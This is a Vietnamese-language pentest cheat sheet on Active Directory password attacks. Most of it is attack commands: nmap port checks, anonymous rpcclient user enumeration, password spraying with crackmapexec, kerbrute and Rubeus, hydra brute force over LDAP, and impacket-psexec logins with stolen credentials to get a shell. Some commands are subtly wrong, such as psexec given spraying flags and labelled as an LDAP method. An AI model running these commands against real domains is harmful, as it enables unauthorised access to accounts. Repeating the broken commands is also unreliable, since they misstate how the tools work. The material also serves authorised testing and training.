# Password Attacks

## Điểm chính khai thác

* Lỗ hổng: Tài khoản AD với mật khẩu yếu/phổ biến hoặc bị rò rỉ, không có cơ chế khóa tài khoản chặt chẽ.
* Tác động: Đăng nhập thành công vào tài khoản người dùng hoặc dịch vụ, dẫn đến truy cập trái phép.
* Điều kiện khai thác:
  * Truy cập đến các cổng như LDAP (389/tcp, 636/tcp), SMB (445/tcp), hoặc Kerberos (88/UDP).
  * Tài khoản domain hợp lệ (user bình thường) để thử nghiệm.
  * Mật khẩu yếu, mặc định, hoặc đã bị rò rỉ từ các nguồn khác.

## Kiểm tra lỗ hổng

### Kiểm tra cổng khả dụng

Xác định các cổng liên quan đến xác thực AD:

```
nmap -p 389,445,88 <dc_ip>
```

### Liệt kê tài khoản

Thu thập danh sách tài khoản để tấn công:

```
rpcclient -U "" <dc_ip> -N -c "enumdomusers"
```

## Tấn công từ xa

### Password Spraying qua LDAP

Thử các mật khẩu phổ biến trên nhiều tài khoản qua LDAP:

{% code overflow="wrap" %}

```
impacket-psexec -dc-ip <dc_ip> -usersfile <users_file> -password <common_pass> <domain>/
```

{% endcode %}

### Password Spraying qua SMB

Thử mật khẩu qua SMB với công cụ crackmapexec:

{% code overflow="wrap" %}

```
crackmapexec smb <dc_ip> -u <users_file> -p <common_pass> -d <domain> --continue-on-success
```

{% endcode %}

### Password Spraying qua Kerberos

Thử mật khẩu qua Kerberos với yêu cầu AS-REQ:

{% code overflow="wrap" %}

```
kerbrute passwordspray -d <domain> --dc <dc_ip> <users_file> <common_pass>
```

{% endcode %}

### Brute Force qua LDAP

Thử danh sách mật khẩu lớn trên một tài khoản qua LDAP:

```
hydra -l <username> -P <password_file> ldap://<dc_ip>
```

### Stolen Credentials qua LDAP

Sử dụng thông tin tài khoản rò rỉ để đăng nhập:

```
impacket-psexec <domain>/<stolen_user>:<stolen_pass>@<dc_ip>
```

## Tấn công nội bộ

### Password Spraying qua Kerberos

Thử mật khẩu qua Kerberos từ máy trong domain:

```
Rubeus.exe spray /password:<common_pass> /usersfile:<users_file> /domain:<domain>
```

## Kiểm tra kết quả

### Lệnh

Kiểm tra kết nối thành công sau khi đăng nhập:

```
whoami
```

### Xác nhận

Xác minh quyền truy cập với shell:

```
impacket-psexec <domain>/<user>:<pass>@<dc_ip>
```
